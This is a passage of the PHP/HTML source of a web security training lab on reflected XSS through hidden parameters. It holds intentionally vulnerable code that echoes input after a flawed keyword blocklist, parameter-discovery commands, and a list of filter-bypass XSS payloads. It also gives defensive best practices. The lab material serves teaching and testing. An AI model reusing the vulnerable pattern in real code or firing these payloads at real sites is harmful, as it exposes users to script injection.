      overflow-y: auto;
      background: rgba(15, 23, 42, 0.7);
      border-radius: 8px;
      padding: 1rem;
      margin-top: 1rem;
      border: 1px solid #334155;
    }
  </style>
</head>
<body>
  <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
    <div class="container-fluid">
      <a class="navbar-brand" href="/">
        <i class="bi bi-shield-shaded me-2"></i>KrazePlanetLabs
      </a>
      <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
        data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
        aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>

      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav me-auto mb-2 mb-lg-0">
          <li class="nav-item">
            <a class="nav-link active" href="../../about">About</a>
          </li>
          <li class="nav-item">
            <a class="nav-link active" href="../../contact">Contact Us</a>
          </li>
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle active" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
              Categories
            </a>
            <ul class="dropdown-menu">
              <li><a class="dropdown-item" href="#">Reflected XSS</a></li>
              <li><a class="dropdown-item" href="#">Stored XSS</a></li>
              <li><a class="dropdown-item" href="#">DOM XSS</a></li>
              <li><a class="dropdown-item" href="#">Blind XSS</a></li>
            </ul>
          </li>
        </ul>
        <form class="d-flex" role="search">
          <input class="form-control search-box me-2" type="search" placeholder="Search labs..." aria-label="Search">
          <button class="btn btn-outline-success" type="submit">Search</button>
        </form>
      </div>
    </div>
  </nav>

  <div class="hero-section">
    <div class="container">
      <h1 class="hero-title">Advanced Hidden Parameter XSS Lab</h1>
      <p class="hero-subtitle">Discover multiple hidden parameters and bypass extensive encoding filters</p>
    </div>
  </div>

  <div class="container mb-5">
    <div class="lab-info">
      <div class="hidden-param-badge">Advanced Filtering Challenge</div>
      <h3 class="section-title">Lab Overview</h3>
      <p>This lab contains multiple hidden parameters with extensive filtering that blocks various encoding techniques. The visible form uses secure HTML encoding, but there are several hidden endpoints with advanced filtering.</p>
      
      <div class="function-filter-notice">
        <i class="bi bi-exclamation-triangle me-2"></i><strong>Visible Challenge:</strong> Basic HTML encoding using <code>htmlspecialchars()</code> for both first name and last name parameters.
      </div>
      
      <div class="arjun-tool-info">
        <i class="bi bi-tools me-2"></i><strong>Hidden Parameters:</strong> There are multiple hidden parameters that are not shown in the form. Use tools like Arjun to discover them!
        <div class="mt-2">
          <div>
            <span class="param-badge">id</span>
            <span class="param-badge">cat</span>
            <span class="param-badge">page</span>
            <span class="param-badge">number</span>
            <span class="param-badge">page_id</span>
            <span class="param-badge">categoryid</span>
          </div>
        </div>
      </div>
      
      <div class="filter-info">
        <i class="bi bi-funnel me-2"></i><strong>Advanced Filter:</strong> Extensive string replacement that blocks multiple dangerous strings, case variations, and encoding attempts
        <div class="case-variations">
          <strong>Blocked items include:</strong>
          <div class="filtered-items">
            <div class="mb-2">
              <strong>Keywords:</strong>
              <span class="encoding-badge">script</span>
              <span class="encoding-badge">alert</span>
              <span class="encoding-badge">confirm</span>
              <span class="encoding-badge">prompt</span>
              <span class="encoding-badge">eval</span>
              <span class="encoding-badge">img</span>
              <span class="encoding-badge">svg</span>
              <span class="encoding-badge">onfocus</span>
              <span class="encoding-badge">ontoggle</span>
              <span class="encoding-badge">onmousemove</span>
              <span class="encoding-badge">onmouseover</span>
            </div>
            <div class="mb-2">
              <strong>Case Variations:</strong>
              <span class="encoding-badge">Script</span>
              <span class="encoding-badge">sCript</span>
              <span class="encoding-badge">scRipt</span>
              <span class="encoding-badge">scrIpt</span>
              <span class="encoding-badge">scriPt</span>
              <span class="encoding-badge">scripT</span>
              <span class="encoding-badge">SCript</span>
              <span class="encoding-badge">SCRipt</span>
              <span class="encoding-badge">SCRIpt</span>
              <span class="encoding-badge">SCRIPt</span>
              <span class="encoding-badge">SCRIPT</span>
            </div>
            <div class="mb-2">
              <strong>Encoding Attempts:</strong>
              <span class="encoding-badge">HTML entities</span>
              <span class="encoding-badge">Hex encoding</span>
              <span class="encoding-badge">Unicode escapes</span>
              <span class="encoding-badge">String concatenation</span>
            </div>
          </div>
        </div>
        <div class="mt-2">
          <small>Filter method: <code>str_replace($arr, '', $_GET['parameter'])</code> with extensive blocklist of 100+ items</small>
        </div>
      </div>
      
      <div class="mt-3">
        <div class="d-flex justify-content-between align-items-center">
          <span>Filter Complexity:</span>
          <span class="text-warning">Extensive Blocklist Filtering</span>
        </div>
        <div class="progress">
          <div class="progress-bar" style="width: 95%"></div>
        </div>
      </div>
      
      <p><strong>Objective:</strong> Discover the hidden parameters and bypass the extensive filter to execute XSS.</p>
    </div>

    <div class="row">
      <div class="col-lg-6">
        <div class="card mb-4">
          <div class="card-header text-center">
            <i class="bi bi-code-slash me-2"></i>Backend Source Code
          </div>
          <div class="card-body">
            <pre>
if(isset($_GET["fname"]) && isset($_GET["lname"])){
    echo htmlspecialchars($_GET["fname"], ENT_QUOTES);
    echo htmlspecialchars($_GET["lname"], ENT_QUOTES);
}
elseif(isset($_GET["id"])){
    $arr = array('details','alert','confirm','prompt','eval','details','ontoggle','onmousemove','onmouseover','script','Script','sCript','scRipt','scrIpt','scriPt','scripT','SCript','SCRipt','SCRIpt','SCRIPt','SCRIPT','script','img','image','svg','onfocus', '"c"+"onfirm(1)">', '"co"+"nfirm(1)">', '"con"+"firm(1)">', '"conf"+"irm(1)">', '"confi"+"rm(1)">', '"confir"+"m(1)">', '"confirm"+"(1)">', '"c"+"o"+"n"+"f"+"i"+"r"+"m"+"(1)">', "&#97;lert(1)", "a&#108;ert(1)", "al&#101;rt(1)", "ale&#114;t(1)", "aler&#116;(1)", "&#97;&#108;&#101;&#114;&#116;(1)", "alert&#40;1&#41;", "&#x61;lert(1)", "a&#x6c;ert(1)", "al&#x65;rt(1)", "ale&#x72;t(1)", "aler&#x74;(1)", "&#x61;&#x6c;&#x65;&#x72;&#x74;(1)", "alert&#x28;1&#x29;", "&#x000061;lert(1)", "a&#x00006c;ert(1)", "al&#x000065;rt(1)", "ale&#x000072;t(1)", "aler&#x000074;(1)", "&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;(1)", "alert&#x000028;1&#x000029;", "\u0061lert(1)", "a\u006cert(1)", "al\u0065rt(1)", "ale\u0072t(1)", "aler\u0074(1)", "\u0061\u006c\u0065\u0072\u0074(1)", "&#99;onfirm(1)", "c&#111;nfirm(1)", "co&#110;firm(1)", "con&#102;irm(1)", "conf&#105;rm(1)", "confi&#114;m(1)", "confir&#109;(1)", "&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)", "confirm&#40;1&#41;", "&#x63;onfirm(1)", "c&#x6f;nfirm(1)", "co&#x6e;firm(1)", "con&#x66;irm(1)", "conf&#x69;rm(1)", "confi&#x72;m(1)", "confir&#x6d;(1)", "&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;(1)", "confirm&#x28;1&#x29;", "&#x000063;onfirm(1)", "c&#x00006f;nfirm(1)", "co&#x00006e;firm(1)", "con&#x000066;irm(1)", "conf&#x000069;rm(1)", "confi&#x000072;m(1)", "confir&#x00006d;(1)", "&#x000063;&#x00006f;&#x00006e;&#x000066;&#x000069;&#x000072;&#x00006d;(1)", "confirm&#x000028;1&#x000029;", "\u0063onfirm(1)", "c\u006fnfirm(1)", "co\u006efirm(1)", "con\u0066irm(1)", "conf\u0069rm(1)", "confi\u0072m(1)", "confir\u006d(1)", "\u0063\u006f\u006e\u0066\u0069\u0072\u006d(1)", "&#112;rompt(1)", "p&#114;ompt(1)", "pr&#111;mpt(1)", "pro&#109;pt(1)", "prom&#112;t(1)", "promp&#116;(1)", "&#112;&#114;&#111;&#109;&#112;&#116;(1)", "prompt&#40;1&#41;", "&#x70;rompt(1)", "p&#x72;ompt(1)", "pr&#x6f;mpt(1)", "pro&#x6d;pt(1)", "prom&#x70;t(1)", "promp&#x74;(1)", "&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;(1)", "prompt&#x28;1&#x29;", "&#x000070;rompt(1)", "p&#x000072;ompt(1)", "pr&#x00006f;mpt(1)", "pro&#x00006d;pt(1)", "prom&#x000070;t(1)", "promp&#x000074;(1)", "&#x000070;&#x000072;&#x00006f;&#x00006d;&#x000070;&#x000074;(1)", "prompt&#x000028;1&#x000029;", "\u0070rompt(1)", "p\u0072ompt(1)", "pr\u006fmpt(1)", "pro\u006dpt(1)", "prom\u0070t(1)", "promp\u0074(1)", "\u0070\u0072\u006f\u006d\u0070\u0074(1)");
    $re = str_replace($arr, '', $_GET['id']);
    echo $re;
}
// Similar code for cat, page, number, page_id, categoryid
# use arjun tool to find hidden parameters</pre>
          </div>
        </div>
      </div>
      
      <div class="col-lg-6">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-input-cursor-text me-2"></i>Test Input Forms
          </div>
          <div class="card-body">
            <h5 class="mb-3">Challenge 1: HTML Encoding (Visible)</h5>
            <form action="" method="get" class="mb-4">
              <div class="mb-3">
                <label for="fname" class="form-label">First Name <span class="badge bg-success">HTML Encoded</span></label>
                <input class="form-control" type="text" placeholder="Enter first name" aria-label="First name" name="fname" value="<?php echo isset($_GET['fname']) ? htmlspecialchars($_GET['fname']) : ''; ?>">
                <div class="form-text">This field uses htmlspecialchars() encoding</div>
              </div>
              <div class="mb-3">
                <label for="lname" class="form-label">Last Name <span class="badge bg-success">HTML Encoded</span></label>
                <input class="form-control" type="text" placeholder="Enter last name" aria-label="Last name" name="lname" value="<?php echo isset($_GET['lname']) ? htmlspecialchars($_GET['lname']) : ''; ?>">
                <div class="form-text">This field uses htmlspecialchars() encoding</div>
              </div>
              <button type="submit" class="btn btn-primary mt-3">Test HTML Encoding</button>
            </form>
            
            <hr class="my-4">
            
            <h5 class="mb-3">Challenge 2: Hidden Parameters with Advanced Filtering</h5>
            <div class="tool-tip">
              <i class="bi bi-info-circle me-2"></i><strong>Hint:</strong> There are multiple parameter names not shown in the form. You need to discover them using parameter discovery tools.
            </div>
            <div class="mb-3">
              <label class="form-label">Try these hidden parameters:</label>
              <div>
                <span class="param-badge">id</span>
                <span class="param-badge">cat</span>
                <span class="param-badge">page</span>
                <span class="param-badge">number</span>
                <span class="param-badge">page_id</span>
                <span class="param-badge">categoryid</span>
              </div>
            </div>
            <form action="" method="get">
              <div class="mb-3">
                <label for="param_name" class="form-label">Parameter Name <span class="badge" style="background: linear-gradient(45deg, var(--accent-orange), var(--accent-red));">Discover Me!</span></label>
                <input class="form-control" type="text" placeholder="Enter parameter name (e.g., id, cat, page)" aria-label="Parameter name" name="param_name" value="<?php echo isset($_GET['param_name']) ? htmlspecialchars($_GET['param_name']) : ''; ?>">
              </div>
              <div class="mb-3">
                <label for="param_value" class="form-label">Parameter Value</label>
                <input class="form-control" type="text" placeholder="Enter payload to test" aria-label="Parameter value" name="param_value" value="<?php echo isset($_GET['param_value']) ? htmlspecialchars($_GET['param_value']) : ''; ?>">
                <div class="form-text">These parameters use advanced filtering with extensive blocklist</div>
              </div>
              <button type="submit" class="btn btn-primary mt-3">Test Hidden Parameter</button>
            </form>
          </div>
        </div>
      </div>
    </div>

    <?php if(isset($_GET["fname"]) && isset($_GET["lname"])): ?>
    <div class="output-section">
      <div class="output-title">
        <i class="bi bi-arrow-return-right me-2"></i>Challenge 1 Output (HTML Encoded)
      </div>
      <div class="output-content">
        <?php 
          echo htmlspecialchars($_GET["fname"], ENT_QUOTES);
          echo htmlspecialchars($_GET["lname"], ENT_QUOTES);
        ?>
      </div>
      <div class="mt-3">
        <small class="text-success"><i class="bi bi-check-circle me-1"></i>Output is safely encoded with htmlspecialchars()</small>
      </div>
    </div>
    <?php endif; ?>

    <?php 
    // Handle the dynamic parameter testing
    $hidden_params = ['id', 'cat', 'page', 'number', 'page_id', 'categoryid'];
    if(isset($_GET["param_name"]) && isset($_GET["param_value"])):
      $param_name = $_GET["param_name"];
      $param_value = $_GET["param_value"];
      
      if(in_array($param_name, $hidden_params)):
    ?>
    <div class="output-section">
      <div class="output-title">
        <i class="bi bi-arrow-return-right me-2"></i>Challenge 2 Output (Filtered) - Parameter: <?php echo htmlspecialchars($param_name); ?>
      </div>
      <div class="output-content">
        <?php 
          $arr = array('details','alert','confirm','prompt','eval','details','ontoggle','onmousemove','onmouseover','script','Script','sCript','scRipt','scrIpt','scriPt','scripT','SCript','SCRipt','SCRIpt','SCRIPt','SCRIPT','script','img','image','svg','onfocus', '"c"+"onfirm(1)">', '"co"+"nfirm(1)">', '"con"+"firm(1)">', '"conf"+"irm(1)">', '"confi"+"rm(1)">', '"confir"+"m(1)">', '"confirm"+"(1)">', '"c"+"o"+"n"+"f"+"i"+"r"+"m"+"(1)">', "&#97;lert(1)", "a&#108;ert(1)", "al&#101;rt(1)", "ale&#114;t(1)", "aler&#116;(1)", "&#97;&#108;&#101;&#114;&#116;(1)", "alert&#40;1&#41;", "&#x61;lert(1)", "a&#x6c;ert(1)", "al&#x65;rt(1)", "ale&#x72;t(1)", "aler&#x74;(1)", "&#x61;&#x6c;&#x65;&#x72;&#x74;(1)", "alert&#x28;1&#x29;", "&#x000061;lert(1)", "a&#x00006c;ert(1)", "al&#x000065;rt(1)", "ale&#x000072;t(1)", "aler&#x000074;(1)", "&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;(1)", "alert&#x000028;1&#x000029;", "\u0061lert(1)", "a\u006cert(1)", "al\u0065rt(1)", "ale\u0072t(1)", "aler\u0074(1)", "\u0061\u006c\u0065\u0072\u0074(1)", "&#99;onfirm(1)", "c&#111;nfirm(1)", "co&#110;firm(1)", "con&#102;irm(1)", "conf&#105;rm(1)", "confi&#114;m(1)", "confir&#109;(1)", "&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)", "confirm&#40;1&#41;", "&#x63;onfirm(1)", "c&#x6f;nfirm(1)", "co&#x6e;firm(1)", "con&#x66;irm(1)", "conf&#x69;rm(1)", "confi&#x72;m(1)", "confir&#x6d;(1)", "&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;(1)", "confirm&#x28;1&#x29;", "&#x000063;onfirm(1)", "c&#x00006f;nfirm(1)", "co&#x00006e;firm(1)", "con&#x000066;irm(1)", "conf&#x000069;rm(1)", "confi&#x000072;m(1)", "confir&#x00006d;(1)", "&#x000063;&#x00006f;&#x00006e;&#x000066;&#x000069;&#x000072;&#x00006d;(1)", "confirm&#x000028;1&#x000029;", "\u0063onfirm(1)", "c\u006fnfirm(1)", "co\u006efirm(1)", "con\u0066irm(1)", "conf\u0069rm(1)", "confi\u0072m(1)", "confir\u006d(1)", "\u0063\u006f\u006e\u0066\u0069\u0072\u006d(1)", "&#112;rompt(1)", "p&#114;ompt(1)", "pr&#111;mpt(1)", "pro&#109;pt(1)", "prom&#112;t(1)", "promp&#116;(1)", "&#112;&#114;&#111;&#109;&#112;&#116;(1)", "prompt&#40;1&#41;", "&#x70;rompt(1)", "p&#x72;ompt(1)", "pr&#x6f;mpt(1)", "pro&#x6d;pt(1)", "prom&#x70;t(1)", "promp&#x74;(1)", "&#x70;&#x72;&#x6f;&#x6d;&#x70;&#x74;(1)", "prompt&#x28;1&#x29;", "&#x000070;rompt(1)", "p&#x000072;ompt(1)", "pr&#x00006f;mpt(1)", "pro&#x00006d;pt(1)", "prom&#x000070;t(1)", "promp&#x000074;(1)", "&#x000070;&#x000072;&#x00006f;&#x00006d;&#x000070;&#x000074;(1)", "prompt&#x000028;1&#x000029;", "\u0070rompt(1)", "p\u0072ompt(1)", "pr\u006fmpt(1)", "pro\u006dpt(1)", "prom\u0070t(1)", "promp\u0074(1)", "\u0070\u0072\u006f\u006d\u0070\u0074(1)");
          $re = str_replace($arr, '', $param_value);
          echo $re;
        ?>
      </div>
      <?php if($param_value !== $re): ?>
      <div class="mt-3">
        <small class="text-warning"><i class="bi bi-exclamation-triangle me-1"></i>Advanced filter has modified your input</small>
      </div>
      <?php endif; ?>
    </div>
    <?php 
      else: 
    ?>
    <div class="output-section">
      <div class="output-title">
        <i class="bi bi-arrow-return-right me-2"></i>Error
      </div>
      <div class="output-content">
        Parameter "<?php echo htmlspecialchars($param_name); ?>" not found or not accessible. Try one of the hidden parameters.
      </div>
    </div>
    <?php
      endif;
    endif; 
    ?>

    <div class="row mt-4">
      <div class="col-12">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-lightbulb me-2"></i>Parameter Discovery & Bypass Techniques
          </div>
          <div class="card-body">
            <div class="row">
              <div class="col-md-6">
                <h6>Parameter Discovery Tools:</h6>
                <ul>
                  <li><strong>Arjun:</strong> <code>arjun -u https://example.com</code></li>
                  <li><strong>ParamSpider:</strong> <code>python3 paramspider.py -d example.com</code></li>
                  <li><strong>FFUF:</strong> <code>ffuf -w wordlist.txt -u https://example.com?FUZZ=test</code></li>
                  <li><strong>Manual testing:</strong> Try common parameter names like: id, page, view, search, q, s, item, product, cat, category, number, etc.</li>
                </ul>
              </div>
              <div class="col-md-6">
                <h6>Bypass Techniques for Advanced Filter:</h6>
                <ul>
                  <li><strong>Alternative tags:</strong> Use <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code></li>
                  <li><strong>Alternative events:</strong> Use <code>onload</code>, <code>onerror</code>, <code>onclick</code></li>
                  <li><strong>Template literals:</strong> Use <code>${alert(1)}</code> in certain contexts</li>
                  <li><strong>Uncommon tags:</strong> Try <code>&lt;marquee&gt;</code>, <code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code></li>
                  <li><strong>Alternative protocols:</strong> Use <code>vbscript:</code>, <code>data:</code> URIs</li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="row mt-4">
      <div class="col-md-6">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-shield-exclamation me-2"></i>Security Implications
          </div>
          <div class="card-body">
            <p>This lab demonstrates:</p>
            <ul>
              <li>Multiple hidden parameters create complex attack surfaces</li>
              <li>Even extensive blocklists can have bypasses</li>
              <li>Blocklist-based filtering is inherently incomplete</li>
              <li>Parameter discovery is critical for comprehensive security testing</li>
              <li>Different parameters may have different security implementations</li>
              <li>Complex filters can create false sense of security</li>
            </ul>
          </div>
        </div>
      </div>
      <div class="col-md-6">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-check-circle me-2"></i>Best Practices
          </div>
          <div class="card-body">
            <p>For secure web applications:</p>
            <ul>
              <li>Use allowlist-based validation instead of blocklists</li>
              <li>Implement context-aware output encoding</li>
              <li>Use Content Security Policy (CSP) headers</li>
              <li>Conduct thorough parameter discovery during testing</li>
              <li>Document all API endpoints and parameters</li>
              <li>Use security headers: X-XSS-Protection, X-Content-Type-Options</li>
              <li>Regularly update and test security controls</li>
            </ul>
          </div>
        </div>
      </div>
    </div>

    <div class="row mt-4">
      <div class="col-12">
        <div class="card">
          <div class="card-header">
            <i class="bi bi-code-square me-2"></i>Payload Examples for Advanced Filter
          </div>
          <div class="card-body">
            <div class="row">
              <div class="col-md-6">
                <h6>Alternative Tag Vectors:</h6>
                <ul>
                  <li><code>&lt;iframe src="javascript:alert(1)"&gt;</code></li>
                  <li><code>&lt;object data="javascript:alert(1)"&gt;</code></li>
                  <li><code>&lt;embed src="javascript:alert(1)"&gt;</code></li>
                  <li><code>&lt;base href="javascript:alert(1)//"&gt;</code></li>
                  <li><code>&lt;form action="javascript:alert(1)"&gt;&lt;input type=submit&gt;</code></li>
                </ul>
              </div>
              <div class="col-md-6">
                <h6>Alternative Event Handlers:</h6>
                <ul>
                  <li><code>&lt;body onload=alert(1)&gt;</code></li>
                  <li><code>&lt;input onfocus=alert(1) autofocus&gt;</code></li>
                  <li><code>&lt;select onfocus=alert(1) autofocus&gt;</code></li>
                  <li><code>&lt;textarea onfocus=alert(1) autofocus&gt;</code></li>
                  <li><code>&lt;keygen onfocus=alert(1) autofocus&gt;</code></li>
                </ul>
              </div>
            </div>
            <div class="row mt-3">
              <div class="col-12">
                <h6>Advanced Bypass Techniques:</h6>
                <ul>
                  <li><code>&lt;marquee onstart=alert(1)&gt;</code> - Marquee tag with onstart</li>
                  <li><code>&lt;audio src=x onerror=alert(1)&gt;</code> - Audio tag</li>
                  <li><code>&lt;video src=x onerror=alert(1)&gt;</code> - Video tag</li>
                  <li><code>&lt;applet code="javascript:alert(1)"&gt;</code> - Applet tag</li>
                  <li><code>&lt;isindex type=image src=1 onerror=alert(1)&gt;</code> - Isindex tag</li>
                  <li><code>&lt;button onfocus=alert(1) autofocus&gt;</code> - Button with autofocus</li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa"
    crossorigin="anonymous"></script>
</body>
</html>